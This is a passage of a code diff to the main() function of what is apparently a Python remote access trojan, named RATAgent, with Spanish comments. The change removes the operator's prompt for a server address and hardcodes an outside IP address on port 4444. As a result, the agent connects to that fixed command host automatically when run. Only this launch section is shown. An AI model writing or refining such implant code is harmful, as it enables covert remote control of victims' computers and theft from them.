@@ -369,17 +369,14 @@ def main():
     ╚════════════════════════════════════════════════════════════╝
     """)
     
-    # Configuración de conexión
-    server_host = input("IP del servidor: ").strip()
-    server_port = input("Puerto del servidor (Enter para 4444): ").strip() or '4444'
+    # Configuración automática - IP fija del servidor
+    server_host = '3.18.79.66'
+    server_port = 4444
     
-    if not server_host:
-        print("[-] Debe especificar la IP del servidor")
-        return
+    print(f"[*] Conectando al servidor: {server_host}:{server_port}")
+    print("[*] Iniciando agente...")
     
     try:
-        server_port = int(server_port)
-        
         agent = RATAgent(server_host, server_port)
         agent.run()
     
@@ -387,6 +384,7 @@ def main():
         print("\n[!] Interrupción detectada. Cerrando agente...")
     except Exception as e:
         print(f"[-] Error: {e}")
+        input("\nPresiona Enter para salir...")
 
 
 if __name__ == "__main__":
